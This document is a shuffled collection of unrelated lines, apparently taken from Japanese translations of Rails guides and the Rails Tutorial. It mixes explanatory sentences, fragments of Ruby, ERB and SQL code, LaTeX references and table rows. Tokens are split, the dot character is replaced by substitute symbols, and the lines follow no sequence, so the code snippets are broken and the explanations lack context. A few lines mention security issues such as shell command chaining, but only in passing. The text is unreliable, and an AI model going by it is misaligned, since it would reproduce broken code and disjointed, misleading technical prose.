変更 後 の ルーティング ファイル を 図 \ ref { fig : home_root _ route } に 示 し ま す 。
アプリケーション を 本番 展開 し たり 、 サンプル データ を 本番 データ と し て 作成 する こと も でき ま す   ( 本番 データベース を リセット する に は \ kode { pg : reset } タスク を 使用 し ま す ) 。
    extend   ActiveSupport: : Concern
#   この オブジェクト は 複製 さ れ た の で 、 複製 さ れ た 方 に だけ 要素 が 追加 さ れ た
\ kode {index } アクション で ユーザー の サイン イン を 要求 する 。
    attr_ name  =   attribute▖ to_s▖tr ( '▖',  '_') ▖ humanize
\ kode {assert_select } に は 色々 な 指定 の 仕方 が あ り ま す ▟ その 代表 例 を いく つ か 表 \ ref{table : assert_select } で 紹介 し ま す 。
###  コード から パス や URL を 生成 する
number ▖object _ id   ==  duplicate▖object _ id    # => true
3 ▖ megabytes   # = >   31 4 5 7 2 8
p  =   Product ▖ new
他 の アップグレード が 完全 に 完了 する まで は 、 既存 の ` secret_token ` を その まま に し て ` secret_key_ base ` を 設定 せ ず 、 非 推奨 警告 を 無視 する と い う 選択 肢 も あ り ま す 。
正式 に は ここ で は 不要 で す が 、 \ kode {nav } タグ は その 内側 が ナビゲーション リンク で あ る と い う 意図 を 伝え る 役割 が あ り ま す 。
この パターン に 一致 する メール アドレス だけ が 有効 で あ る こと を チェック し ま す
     sample  application ▖
RubyGems の 詳細 に つ い て は 、 [ RubyGems ガイド ] ( http://rubygems- guides- jp▖herokuapp▖ com/ ) を 参照 し て くださ い 。
この メソッド は 、 画像 用 の 属性 名 に 応 じ て 、 CarrierWave が 自動 的 に 生成 し て くれ る メソッド で す 。
フォロー ボタン が 動 く よう に な っ た の で 、 バグ を 検知 する ため の シンプル な テスト を 書 い て い き ま しょ う 。
<%  content_ for   : special _script  do  %>
Ruby で は 、 角 かっこ 以外 に も 配列 の 要素 に アクセス する 方法 が 提供 さ れ て い ま す
上 から わか る よう に 、 この バリデーション で は ` Person ` に ` name ` 属性 が な い 場合 に 無効 で あ る こと を 知 ら せ ま す 。
invoke     helper
Factory   Girl を 使用 する と 、 Active   Record が アクセス を 許可 し な い よう な \ kode { created_at } 属性 も 手動 で 設定 でき る の で 大変 便利 で す
パイプライン が 有効 で かつ 現在 の 環境 で 無効 に な っ て い な い 場合 、 この ファイル は Sprockets に よ っ て 扱 わ れ ま す 。
class   TrashableCleanupJob
#   If  you  find   yourself  ignoring   temporary  files   generated   by   your   text   editor
最初 の 例 で は   * * 11 * *   回 も クエリ が 実行 さ れ ま し た が 、 今度 の 例 で は わずか   * * 2 * *   回 に まで 減 り ま し た 。
アセット の キャッシュ ストア
テキスト 、 JSON 、 XML を 出力 する こと も でき ま す 。
ロケール ファイル も 、 アプリケーション の 場合 と 同様 ` config/ locales ` ディレクトリ に 置 け ば よ い よう に な っ て い ま す 。
login_path
構成 さ れ る 時間 が 、 実行 プラットフォーム の ` Time ` で サポート さ れ る 範囲 を 超え て い る 場合 は 、 usec は 破棄 さ れ 、 ` DateTime ` オブジェクト が 代り に 返 さ れ ま す 。
` update ` アクション は 従来 通り 使用 でき 、 ` PUT ` リクエスト は 今後 も ` update ` アクション に ルーティング さ れ ま す 。
Time▖ local ( 2000 ,   7 ,   31 ) ▖ prev_quarter   # =>  Sun ,   30   Apr  2000
TIP:   Ruby   1 ▖ 8 ▖ 7   p 248 および p 249 に は Rails を クラッシュ さ せ る マーシャリングバグ が あ り ま す 。
# `: debug ` を 指定 する と 今後 の デフォルト 設定 が 使用 さ れ る
  <strong > Commenter : </strong >
#### distance _ of_time_in_words
|tmp/| キャッシュ 、 pid 、 セッション ファイル など の 一時 ファイル が 置 か れ ま す 。
    <th   colspan = " 2 " ></th >
たとえば GitHub ユーザー で あ る John Smith が 、 fork し て https://github▖ com/ John Smith /rails の " orange " と い う トピック ブランチ に push し た と し ま す 。
  @ article ▖ save
なお 、 \emph { Rails チュートリアル } で は 、 \ kode {_ path } 書式 を 使用 する 一般 的 な 規約 に 従 い 、 リダイレクト の 場合 のみ \ kode {_url} 書式 を 使用 し ま す 。
id = \ kode { 1 } の ユーザー を 削除 する アクション
* `proxy _ association ▖owner ` は 、 関連 付け を 所有 する オブジェクト を 返 し ま す 。
# => true
最後 に 以下 を 実行 し ま す 。
|  * * Server   Error * *    | 500                | :internal_server_error            |
#   active_ model/serializers/xml ▖rb
\ kode {about } アクション が 追加 さ れ た StaticPages コントローラ
フィクスチャ 向け の digest メソッド を 追加 する
    if  discount > total_ value
index アクション に 対応 し て い る ビュー
sanitize @ article ▖ body
{ 0 } 図 12 ▖ 13 { / 0 }   { 1 } プロフィール 画面   ( \ href { http://local host : 3000 / users /5 }{ / users /5 } )   に   [ Unfollow ]   ボタン が 表示 さ れ て い る { / 1 }
delegate :table_name ,  to : : class
module  Blorgh
先 の 例 で 説明 し た とおり 、 キー が レシーバ と 引数 で 重複 し て い る 場合 、 引数 の 側 の 値 が 優先 さ れ ま す 。
/ db /*▖sqlite 3 - journal
success
SELECT   viewable_by ,   locked   FROM   clients
# = = = =   Examples
\emph { 範囲   ( range ) }  は 、 配列 と 密接 に 関係 し て い ま す ▟ \ kode {to_a } メソッド を 使用 し て 配列 に 変換 する と 理解 し やす い と 思 い ま す 。
#    </ text area >
これ に よ っ て 、 カレント ユーザー に 所属 する マイクロ ポスト だけ が 自動 的 に 見つか る こと が 保証 さ れ ま す 。
*   [ Ruby   on   Rack   # 2   -   The  Builder ] ( http://m ▖onkey▖org / ruby - on - rack - 2 - the -builder )
< form   accept - charset = " UTF - 8 "   action = "/articles "   data - remote= " true "   method= " post " >
Ruby で は 、 \ kode { Digest } ライブラリ の \ kode {hexdigest } メソッド を 使用 し た MD 5 ハッシュ アルゴリズム が 実装 さ れ て い ま す 。
クエリ 文字 列   ( 訳注 :  ` ? パラメータ 名 = 値 ` の 形式 で URL の 末尾 に 置 か れ る パラメータ )   で 指定 さ れ て い る パラメータ も すべて ` params ` に 含 ま れ ま す 。
# loaded and   you  are   going   to  fetch  the   records  anyway  it   is   better  to   ( どう し て も レコード を 取り出 し た い 場合 は )
`: to ` オプション が 文字 列 に 変換 さ れ る と 、 メソッド の 委譲 先 と な る オブジェクト に 評価 さ れ る 式 に な り ま す 。
セキュア パスワード と い う 手法 で は 、 各 ユーザー に パスワード と パスワード の 確認 を 入力 さ せ 、 それ を   ( その まま で は な く )   暗号 化 し た もの を データベース に 保存 し ま す 。
$ ( document ) ▖ ready - >
#####   追加 の カラム メソッド
GitHub と Bitbucket
        force     config/application ▖ rb
-------------------------------------
\ kode { footer } タグ の ルール が 、 劇的 に 向上 し て い る こと を 確認 し て み て くださ い 。
計算 の 順序 が 異な る 場合 、 同じ 結果 が 得 られ な い 可能 性 が あ り ま す 。
本書 で は Rails   4 ▖ 0 を 使用 し ま す ▟ 以下 を 実行 し て インストール し て くださ い 。
   validates : name ,   presence :  true
\ kode {redirect\_back\_or } メソッド で は 、 次 の よう に or 演算 子 \ kode {||} を 使用 し ま す 。
xml ▖em  {  xml ▖ b ( "emph  &  bold " )   }
上 と 同様 、 \ kode {container } クラス も Bootstrap に お い て 特別 な 意味 を 持 ち ま す 。
User の マイクロ ポスト の 集合 を かえ す
#### ` has_and _belongs_to_many ` 関連 付け に 対応 する 結合 テーブル を 作成 する
その 他 の 変更 は リポジトリ に コミット し ま しょ う 。
WARNING :   引数 が ` IO ` の 場合 、 再 試行 を 可能 に する ため に ` rewind ` に 応答 する 必要 が あ り ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : signed_ in_p } に 示 し ま す 。
SELECT  *  FROM   articles   WHERE   id   >   10   ORDER   BY  id   asc   LIMIT   20
   class   Articles Controller <  Application Controller
たとえば 、 顧客 ( customer ) と 注文 ( order ) を 含 む Rails アプリケーション で は 、 顧客 の モデル を 以下 の よう に 宣言 する こと が でき ま す 。
バック エンド で My SQL を 使用 し て い る 場合 、 上 の セッション に よ っ て 以下 の SQL が 生成 さ れ ま す 。
      'X - Content- Type - Options' => 'nosniff '
\ kode {remember } メソッド を User モデル に 追加 する  
` config▖ action_controller ` に は 多数 の 設定 が 含 ま れ て い ま す 。
\ kode{gravatar \_ for } ヘルパー に キー ワード 引数 を 追加 する
redirect_to   params [ : referer ]
Active   Job は 、 ジョブ の ライフ サイクル で の フック を 提供 し ま す 。
一般 的 な シナリオ の 1 つ は 、 生成 し た コード を 元 に 戻 し た い 場合 で す ▟ たとえば 、 コントローラ を 生成 し た 後 で 、 もっと い い コントローラ 名 を 思い付 い た 場合 など で す 。
      <%=  content_ for ?(:news_content )   ?  
送信 が 無効 だっ た 場合 と 有効 だっ た 場合 の 画面 を それぞれ 図 \ ref { fig : password _ reset_failure } と 図 \ ref { fig : password _ reset_success } に 示 し ま す
この 状況 は 、 自己 結合 関連 付け を 使用 し て モデル 化 する こと が でき ま す 。
最後 に 、 ユーザー を 削除 し 、 データベース から 完全 に 消去 する 機能 を 追加 し ま す 。
ある ミドルウェア の 前 に 別 の ミドルウェア を 追加 し た い 場合 は ` insert_before ` を 使用 し ま す 。
データベース の インデックス を 理解 する ため に は 、 本 の 索引 と の 類似 性 を 考え る と よ い で しょ う 。
たとえば 、 この 章 で は 、 サイト の ヘッダー 部分 に サイン イン ／ サイン アウト の リンク と プロファイル へ の リンク を 表示 する よう に し ま す 。
これ は 、 RSpec を 実行 する たび に Rails の 環境 全体 を 読み込 み直 す 必要 が あ る ため で す 。
### `truncate_words `
最後 の 部分 で は 、 Rails が テンプレート を 探 し た 場所 が 示 さ れ て い ま す 。
       attachments▖inline [ 'image▖ jpg ']  =  File ▖ read ( '/ path/to/image▖ jpg ')
   def  show
` layout ` 宣言 を 使用 する こと で 、 デフォルト の レイアウト 名 ルール を 上書き する こと が でき ま す 。
DELETE
╼╼\ section { アプリケーション の 計画 } %  ( fold) ╼\ label{ sec : planning_ the_application}╼╼
変更 の 結果 を リスト \ ref{ code : generate_users_controller } に 示 し ま す 。
\ href { http://local host : 3000 /static _ pages/home}{/static _ pages/home } に アクセス し て 結果 を 表示 し ま す   ( 図 \ ref { fig: raw _ home_view} ) 。
Aure   に は 、 RailsSpace   で の 協力 と 本書 へ の 支援 も 含め 、 感謝 し た い と 思 い ま す 。
` app/views/blorgh/ comments ` に ディレクトリ を 作成 し 、 `_ form ▖html ▖erb ` と い う ファイル を 作成 し ま す ▟ この ファイル の 中 に 以下 の パーシャル を 記述 し ま す 。
これ ら の 関連 付け を 実装 する ため の 一環 と し て 、 Micropost モデル に 対 する テスト を 作成 し 、 さらに User モデル に いく つ か の テスト を 追加 し ま す 。
` max - age ` の 値 は 秒 単位 で 指定 し ま す ▟ 最大 値 は ` 315 3600 0 ` で あ り 、 これ は 一 年 に 相当 し ま す 。
一部 の 要素 で 、 以下 の よう に CSS   id を 指定 し て い る こと に も ぜひ 注目 し て くださ い 。
@customer▖ orders▖ delete ( @order 1 )
ここ まで の 進捗 を Twitter に 投稿 し たり Facebook で 通知 する に は 以下 の リンク から どうぞ 。
この API は 特定 の 値 に コミット し な い よう に 注意 が 払 わ れ て お り 、 メソッド に は 述語 と 意味 が 示 さ れ て い ま す ▟ これ で 十分 で す 。
*  ` action _mailer▖ compile_config_ methods ` :   指定 さ れ た 設定 用 メソッド を 初期 化 し 、 より 高速 に アクセス でき る よう に し ま す 。
続 い て 、 エンジン は 作成 また は 見つけ た ` User ` オブジェクト を 記事 と 関連 付け ま す 。
これ は 、 メソッド また は スコープ へ の 連鎖 可能 な 応答 が 必要 で 、 しかも 結果 を 一切返 し た く な い 場合 に 便利 で す 。
    has_and _belongs_to_many  : assemblies , -> {  w here   active :  true   }
# => " alert ( 1 ) "
しかし 、 上 の 記法 は Rails 流 で は あ り ま せ ん 。
INFO :   3 つ の メソッド は いずれ も 、 レシーバ が 空 の 場合 は ` nil ` を 返 し ま す 。
#    self ▖ include _root_ in_json  =  false  
上 の ルーティング で は 以下 の 6 つ の ルーティング が 作成 さ れ 、 すべて ` Geocoders ` コントローラ に 割り当て られ ま す 。
次 の 2 行 も わか り やす い と 思 い ま す 。
私 たち は これ まで に 、 ルート URL を 定義 する コード を 3 回 見 て き ま し た ▟ 1 つ 目 は
セッション cookies を 暗号 化 する 方法 の 詳細 に つ い て は [ Pull   Request   # 997 8 ] ( https://github▖ com/rails/rails/pull/ 99 7 8 )   を 参照 し て くださ い 。
上 の 宣言 は ` : id ` パラメータ に 制限 を 加え 、 指定 し た 正規 表現 に のみ マッチ する よう に し ま す 。
#   assign  false   instead   of   true ▖
select_date ( )
TIP:   `update ` に 属性 を すべて 渡 す 必要 は あ り ま せ ん 。
Active   Record   バリデーション
# `: info ` を 指定 する と 現在 の デフォルト 設定 が 使用 さ れ 、
ユーザー 編集 用 の ページ   ( \ href { http://local host : 3000 / users / 1/edit} {/ users / 1/edit } )
Rails   4 ▖ 1 で は 、 Postgre SQL の ` json ` カラム と ` hstore ` カラム を 、 文字 列 を キー と する Ruby の ` Hash ` に 対応 付け る よう に な り ま し た 。
    <%=  image_tag   attachments [ 'image▖ jpg '] ▖url  %>
rake で 実行 可能 な タスク を すべて 表示 する に は 以下 を 実行 し ま す 。
行 を 分割 し た \emph { 理由 } は 、 1 行 を 80 字 以内 に 収め て ソース コード を 読 み やす く する ため で す
           POST    / users ( ▖: format )            users # create
     assoc▖ has_many  : customers
Cucumber と 結合 テスト で それぞれ どの よう に 実装 さ れ て い る か が お わか り いただけ る と 思 い ま す 。
上 は あくまで ガイドライン で あ り 、 最適 な 使用 方法 に つ い て は 各自 で ご 判断 くださ い 。
                    unless :   Proc▖ new { | c|  c ▖ trackpad ▖ present ?  
これ は 、 ほとんど の シェル で は 、 コマンド に セミコロン ; や 垂直 バー | を 追加 する こと で 、 別 の コマンド を 簡単 に 結合 する こと が でき て しま う ため で す 。
####  新し い JSON エンコーダ
\ href { http://gravatar ▖ com/}{ Gravatar } の 画像 調整 インターフェイス   ( 写真 は \ href { http://www ▖michaelhartl▖ com/}{ 誰 か さん } )
数値 に 3 桁 ごと の 桁 区切り 文字 を 追加 し ま す 。
ren der template :  " books/edit▖html ▖erb "
で は 、 それぞれ を 順 に 見 て い き ま しょ う 。
=>  " foo "
*   FROM   clients  LEFT   OUTER   JOIN addresses  ON   addresses▖ client_ id   =  clients ▖ id
<%=   link_to   ' Patient   Record ' ,   patient_ path( @ patient )  %>
< a   href = " ▖▖▖"   data- no-turbolink> No turbolinks  here </a>▖
\ kode { full \_title } ヘルパー の テスト
今後 の 章 で は 、 ブランチ や コミット メッセージ は もちろん 異な り ま す が 、 基本 的 な アイディア は 同じ で す 。
ヒント と 注意 事項
   validates : mouse ,   presence :  true ,
( これ が 上 で 述べ た セキュリティ ホール で す )   。
Array ▖wrap ( 0 )           # =>  [ 0 ]
`@ products ` が ` product ` インスタンス の コレクション で あ る と する と 、 ` index▖html ▖erb ` に 以下 の よう に 書 く こと で 同じ 結果 を 得 られ ま す 。
もし この テスト が 少し 抽象 的 すぎ る と 感じ る なら 、 Rails コンソール を 起動 し て 確認 し ま しょ う 。
$ bun dle   exec   rails   new ~/my - test - app  -- dev
*   Active   Record の モデル 同士 の 関連 付け を 宣言 する 方法
* `: delete ` --   オブジェクト が destroy さ れ る と 、 関連 付け られ た オブジェクト は すべて 直接 削除 さ れ ま す ▟ この とき オブジェクト の ` destroy ` メソッド は 呼び出 さ れ ま せ ん 。
####  何 も 出力 し な い 方法
Rails が 返 す レスポンス の HTTP ステータス コード は 自動 的 に 生成 さ れ ま す   ( ほとんど の 場合 ` 200   OK ` と な り ま す ) 。
デフォルト の \ kode { Gemfile } を テキスト エディタ で 開 く 。
class  User
たとえば   " 小さ い "   画像 を 表示 する だけ な の に 、 やたら に 読み込 み 時間 が 長 い ウェブサイト に 訪れ た こと は あ り ま せ ん か 。
`image_tag ` の 場合 と 同様 、 絶対 パス また は ` public/videos ` ディレクトリ から の 相対 パス を 指定 でき ま す 。
development 環境 に いく つ か の 新し い 設定 を 追加 する 必要 が あ り ま す 。
たとえば 、 \ kode {: success } と \ kode {: error } と い う   2 つ の 状態 を 持 つ   \ kode {flash}   と い う 名前 の ハッシュ に つ い て 考え て み ま しょ う 。
    has _one   : account ,   class_ name :  " Billing "
( 技術 的 な 理由 に よ り 、 \ kode {rails } コマンド だけ は 例外 で す ) 。
  $( " # results " ) ▖ append  html
エンジン を テスト する
マイグレーション ファイル の 名前 に は タイム スタンプ が 含 ま れ て お り 、 これ に 基 い て 、 マイグレーション は 作成 さ れ た 順 に 実行 さ れ ま す 。
*   `update`
残 る 制約 は 、 メール アドレス が 一意 で あ る こと を 強制 する もの だけ と な り ま し た 。
アカウント 有効 化 に 使用 する リソース を 追加 する
デフォルト で は   id 順 に 並 ぶ ため \ kode { [ older_micropost ,   newer_micropost ] } の 順序 に な り テスト は 失敗 する はず で す 。
次 の 第 \ ref { cha : sign_up } 章 で は 、 ユーザー を 作成 する ため の ユーザー 登録 フォーム を 作成 し 、 各 ユーザー の 情報 を 表示 する ため の ページ も 作成 し ま す 。
この \ kode { heroku } コマンド を 実行 する と 、 Rails アプリケーション 専用 の サブ ドメイン が 作成 さ れ 、 ただちに ブラウザ で 表示 可能 に な り ま す 。
最初 に 、 以下 に 従 っ て RVM の バージョン を 最新 に し ま す 。
チェック ボックス が オン の とき に \ kode { ’ 1 ’ } に な り 、 オフ の とき に \ kode { ’ 0 ’ } に な り ま す 。
パーシャル は データ の 繰り返 し   ( コレクション )   を 出力 する 場合 に も きわめて 便利 で す 。
options   =  options ▖ reverse_merge ( length :   30 ,  omis sion : "▖▖▖ " )
本書 に は 、 そう し た 方々 が 初めて Rails を 学 ん だ 頃 より も 新し い 技術 が ふんだん に 盛り込 ま れ て い る ため 、 本書 で 学 ぶ 技術 は きっと 役 に 立 つ はず で す 。
Git を 使用 し て い る 方 は 、 しばらく コミット し て い な かっ た の で あ れ ば 、 この 時点 で コミット し て お く の が よ い で しょ う 。
Users コントローラ は 、 作成 時 に 既に \ kode {new } アクション を 持 っ て い る ため 、 後 は テスト を パス さ せ る ため に 正し い ルート と ビュー の 中身 を 作成 すれ ば よ い の で す 。
詳細 に つ い て は 、 Stack   Overflow の 「 \ href { http://stackoverflow ▖ com/questions/53595 58 /when - to -use -rspec - let } { どんな とき に let を 使用 す べ き か }   ( 英語 ) 」 を 参照 し て くださ い 。
ルーティング を 作成 する と 、 ルーティング ヘルパー も 作成 さ れ ま す ▟ ヘルパー は ` magazine_ads _url` や `edit_ magazine_ad _ path ` の よう な 名前 に な り ま す 。
技術 的 に は 、 アセット パイプライン は 既に Rails   4 の コア 機能 で は あ り ま せ ん ▟ フレームワーク から 分離 さ れ 、 [ sprockets- rails ] (https://github▖ com/rails/sprockets- rails ) と い う gem に 書き出 さ れ て い ま す 。
     create_table  : parts  do  | t |
モジュール が 無名 また は トップ レベル の 場合 、 ` parent ` は `Object ` を 返 し ま す 。
これ は リスト \ ref{ code :user_factory } で 使用 さ れ て い ま し た 。
これ に 対応 する アプリケーション 側 の 実装 は 、 User の \ kode { name } 用 バリデーション   ( リスト \ ref{ code :length_ validation } )   と 全く 同じ で す ▟ リスト \ ref{ code :micropost _validations } に 結果 を 示 し ま す 。
なお 、 この とき 、 \ kode {: destroy }  も  \ kode { signed_ in_user }  の   before_ action   に 追加 し て い ま す 。
class   AccountHistory  <  ActiveRecord : : Base
*  `select `
| ` Rails : : Rack : : Debugger` |  デバッガ を 起動 する                                                                    |
No   route  matches  [ GET ]   "/static _ pages/about "
これ ら の テスト は 、 RSpec で 使 わ れ る \emph { 論理 値 の 慣習 } に 依存 し て い ま す ▟ 以下 の コード は 、
新し い セッション の フォーム が 再度 表示 さ れ 、 フラッシュ メッセージ が 追加 さ れ る こと を 確認 する
<%=   link_to  ' Magazine   details ' , @magazine  %>
<% =  ren der   partial :   " product " ,   collection : @products ,   layout :   " special _layout "  %>
辞書 順 に 基 い て 生成 さ れ た 結合 テーブル の デフォルト 名 が 気 に 入 ら な い 場合 、 ` : join_table ` オプション を 使用 し て デフォルト の テーブル 名 を 上書き でき ま す 。
この アセット を サーバー クラスタ に デプロイ する と 、 サーバー 間 で ファイル の タイム スタンプ が 同じ に な る 保証 が な い ため 、 リクエスト を 受け る サーバー が 変わ る たび に 値 が 異な っ て しま い ま す 。
恥 を 忍 ん で 申し上げ る と 、 筆者 が 自分 自身 で リスト \ ref{ code :remember_me_ternary } で チェック ボックス の 処理 を 実装 し た とき は 、
Rails で アセット ホスト を 設定 する に は 、 ` config/production ▖rb ` の ` config▖ action_controller ▖ asset_host ` を 以下 の よう に 設定 し ま す 。
上 の コード に あ る 、 以下 の 特殊 な コード に ご 注目 くださ い 。
*   データベース :   Rails は データベース から 読み だ し た データ を 境界 上 で UTF - 8 に 変換 し ま す 。
{ 0 } 図 2 ▖ 4   { / 0 } { 1 } Users リソース   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users }{/ users } )   ページ の 最初 の 状態 { / 1 }
たとえば ` Client ▖ w here ( status : : active ) ` の よう な 書 き 方 は でき ま せ ん 。
    <%=  f▖ text _ area   : body %>
上 の コード は 、 作成 する ユーザー の メール アドレス を デフォルト と 異な る もの に 変更 し ま す 。
def  valid ? (
デフォルト は ` - i  - t ` で す 。
フィクスチャ で は ERB を 利用 でき る 点 に ご 注目 くださ い 。
|                     |  417                |  : expectation_failed              |
具体 的 に は 以下 の 変換 を 行 い ま す 。
Home ページ へ の ルート マッピング を 作成 する 際 に 、 以下 の よう な コード を 使用 \ emph { する こと も 一応 可能 で す } 。
幸い 、 \ kode {:uniqueness } で は \ kode {: case \_sensitive } と い う 打ってつけ の オプション が 使用 でき ま す   ( リスト \ ref{ code : validates_uniqueness _of_email _ case _ insensitive } } ) 。
この コード は リスト \ ref{ code : login_upon_signup } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
|                     |  30 8                | : permanent_redirect               |
*   Rails   4 ▖ 0 で は Strong   Parameters の 導入 に 伴 い 、 ` attr_accessible ` と ` attr_protected ` が 廃止 さ れ ま し た 。
Active   Record   クエリ インターフェイス
サンプル アプリケーション を 生成 する
今度 は \ kode { current\ _user } を 以下 の よう に 定義 し 直 し ま す 。
スペース や 共通 スタイル を 追加 し た 結果
つまり 、 ユーザー は プロファイル ページ を 最初 に 表示 し 、 それ から ユーザー を フォロー し 、 その 後 すぐ 元 の ページ に リダイレクト さ れ る と い う 流れ に な り ま す 。
       create   app
最初 の 一 番 重要 な ステップ は 、 サイト の ユーザー 用 の \emph { データ モデル } の 作成 と 、 データ を 保存 する 手段 の 確保 で す 。
デフォルト の ヘッダー は ` config/application ▖rb ` で 設定 を 変更 でき ま す 。
Help ページ の 内容 を テスト する コード を 追加 する 。
アプリケーション の 設定
更新 し た \ kode { Gemfile } を リスト \ ref{ code : will _ paginate_gem } に 示 し ま す 。
class  My Mailer <  Action Mailer : : Base
The  tests look   good   too▖   ( テスト も よく 書け て い る よう で す ) 。
     cattr_accessor   : first _ name ,   instance_ reader :  false
= > #<User   id :   1 ,   name :  " Michael   Hartl " ,  email :   " mhartl@example ▖ com " ,
( 図 \ ref { fig :user_ model_sketch } の スケッチ に は 無 かっ た マジック カラム が 追加 さ れ て い ま す ) 。
#   最初 の ユーザー を 返 す
コレクション を レンダリング する とき に も ` : layout ` オプション を 指定 でき ま す 。
仕上げ に 、 最初 の ユーザー だけ を デフォルト で 管理 者 に する よう サンプル データ を 更新 し ま しょ う   ( リスト \ ref{ code : populator_ with _ admin } ) 。
上 の アプリケーション は 以下 の よう に 動作 し ま す 。
データ モデル の 作成 を 初めて 行 っ た
\ kode {micropost \_ params } で Strong   Parameters を 使用 し て い る こと に よ り 、 マイクロ ポスト の \ kode {content } 属性 だけ が Web 経由 で 変更 可能 に な っ て い る こと に 注目 し て くださ い 。
class  Invoice   <  ActiveRecord : : Base
静的 な ページ の 作成 は 、 \ kode { 第 { 1 } 2 { / 1 } 章 } で scaffold 生成 に 使用 し た { 2 } generate{ / 2 } スクリプト で 、 コントローラ を 生成 する こと から 始め ま す 。
Rails 同梱 の SQLite 3 に 代え て My SQL を 採用 し た 場合 、 ` config/ database▖yml ` の 記述 方法 を 少し 変更 し ま す 。
@ supplier ▖ account  = @account
` extract ! ` メソッド は 、 レシーバ の ハッシュ の サブ クラス と 同じ サブ クラス を 返 し ま す 。
Java Script の Sprockets ディレクティブ は `//=` で 始ま り ま す 。
" Help "
*   API ドキュメント を 効果 的 に 書 く 方法
名前 を 持 つ モジュール は 、 対応 する 定数 に 保存 さ れ て い る 場合 に 到達 可能   ( reachable )   と な り ま す 。
{ 0 } 図 5 ▖ 9 { / 0 }   { 1 } \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / signup}{/ signup } で 表示 さ れ る 新し い ユーザー 登録 ページ { / 1 }
これ は リスト \ ref{ code :installing _ rails } で 使用 さ れ て い ま し た 。
# => emails  to   me@email ▖ com▖
`blorgh ` が インストール さ れ て い る アプリケーション の ` config/initializers/blorgh ▖ rb ` に イニシャライザ を 作成 し て 、 以下 の 記述 を 追加 し ま す 。
user 	 0 m 7 ▖ 2 40 s
Sun ,   15   Aug  2010   23 : 59 : 59   UTC   + 0 0 : 0 0
           as : :item,   locals : {title:   " Products   Page " } %>
  * `config/ routes▖rb ` で の 名前 空間 分離
単一 の フィード アイテム 用 の パーシャル
#   email       : string ( 25 5 )
見つか ら な い 場合 は エラー に な り ま す 。
短 い ドキュメント で は 、 スニペット を 紹介 する 際 に " Examples " と 明示 的 に ラベル を 付け る 必要 は な い ▟ 単に パラグラフ に 従 う よう に し ま す 。
create の とき に 既に 行 っ た よう に 、 記事 の 更新 に 失敗 し て エラー が 発生 し た 場合 、 その こと を ユーザー に 伝え る よう に し ま しょ う 。
   def initialize ( x ,   y )
これ で サンプル ユーザー に 、 フォロー し て い る ユーザー の 配列 と フォロワー の 配列 が でき ま し た ▟ ユーザー プロファイル ページ と Home ページ を 更新 し て これ を 反映 し ま しょ う 。
ポリ モー フィック 関連 付け の 図 ] ( images/polymorphic ▖ png )
この shim パーシャル の 場合 は 、 リスト \ ref{ code : layout_new_structure } の わずか 3 行 の shim コード だけ で す 。
Hello   World "
ここ まで くれ ば 、 すべて の テスト は パス する はず で す ▟ そして Users リソース と Users コントローラ 、 User モデル 、 Users ビュー も 今 や 完全 に 動作 し ま す 。
セキュリティ 関連 の issue を 扱 う 方法 の 詳細 に つ い て は 、 [ Rails セキュリティ ポリシー ページ ] ( http://rubyonrails ▖org/ security )   ( 英語 )   を 参照 し て くださ い 。
####   安全 な 文字 列
リスト \ ref{ code : gitignore } の とき
また 、 ルート URL の とき と 同様 に 、 \ kode {help_ path } や \ kode {help_url} と い っ た 名前 付き ルート も 使え る よう に な り ま す 。
リスト \ ref{ code :universal_css } の CSS の 形式 は 一貫 し て い ま す 。
$   RUBYOPT = - W 0   bun dle   exec   rake   test
self を 省略 し た 結果 を リスト \ ref{ code : test _ double_ logout } に 示 し ま す 。
*   ヘッダー と コンテンツ を 指定 し て ファイル 名 を 渡 す と 、 それ ら の 設定 が Action   Mailer と Mail に よ っ て 使用 さ れ ま す 。
   match  '/' => 'root # index' ,   via :  : get
ユーザー を 直前 の ページ に 戻 す 、 特殊 な リダイレクト も 行え ま す 。
Rails で は 、 テスティング を 容易 に する ため に 3 つ の [ ビルト イン アサーション ] ( http://api▖ rubyonrails ▖org / classes / ActionDispatch / Assertions/Routing Assertions ▖html )   が 用意 さ れ て い ま す 。
この よう な 場合 、 ` extract _options !
これ は リスト \ ref{ code : show _ only_ active_users _exercise } で 使用 さ れ て い ま し た 。
###  SQL フラグメント 文字 列 を 使用 する
SELECT  *  FROM   clients  ORDER   BY  clients ▖ id   ASC   LIMIT   1
* * マルチ サーバー 環境 で ファイル 名 が 異な っ て しま う こと が あ る
スタイル を 整え る ため 、 もう 少し CSS ルール を 追加 し ま す   ( リスト \ ref{ code :remember_me_css } ) 。
` rake  secret ` を 実行 し 、 ` development ` セクション ` test ` セクション に 新し い 鍵 を 生成 し ま す 。
Date▖ new (2010 ,   4 ,   30 ) ▖ months_ since ( 2 )  # =>  Wed ,   30   Jun  2010
EXPLAIN   for :   SELECT   ` users ` ▖
` ActiveRecord : : Core : : ClassMethods # arel_table ` を 例 に 説明 し ま す 。
    has_many : todos,   primary _key:  : guid
一部 の バック エンド で は 、 リッ スン する キュー を 指定 する 必要 が あ る もの が あ り ま す 。
すべて の ユーザー を 一覧 する ページ
rest   =   hash ▖ extract ! (:a) ▖ class
    cattr_accessor(:emulate_booleans )  { true   }
Module ▖ new▖anonymous ?  
}}╼\end { figure} ╼╼    %  subsection   header   ( end ) ╼╼    \ subsection { Bootstrap と カスタム CSS } %  ( fold) ╼    \ label{ sec : custom_css}╼╼
`group ` メソッド は 、 結果 を グループ 化 する 際 の 属性 名 を 1 つ 指定 し ま す ▟ 内部 的 に は SQL の ` GRO UP   BY ` 句 が 使用 さ れ ま す 。
     id   int ( 11 )   NOT   NULL   auto_ increment ,
パーシャル 内 の 場合 と 同様 、 この レイアウト で も 現在 の オブジェクト と ( オブジェクト 名) _ counter 変数 を 使用 でき ま す 。
サンプル コード の インデント に は スペース 2 文字 を 使用 する こと ▟ マーク アップ 用 に は 左 マージン に 合わせ て スペース 2 文字 を 使用 し ま す 。
     assoc▖ has_many  : expenses
*  `collection ▖ delete (object ,  ▖▖▖)
#     <imported - from -svn type =" boolean " > false</imported - from -svn >
デフォルト の User テスト   ( モック のみ )
テスト は パス する か 、
cat   < ファイル 名 >
この まま で は 実用 に 耐え な い の で 、 ` show ` アクション を 追加 し て 先 に 進 む こと に し ま しょ う 。
*   Active   Record の クエリ キャッシュ を 有効 に し ま す 。
リレーション に よ っ て トリガ さ れ る クエリ で EXPLAIN を 実行 する こと が でき ま す 。
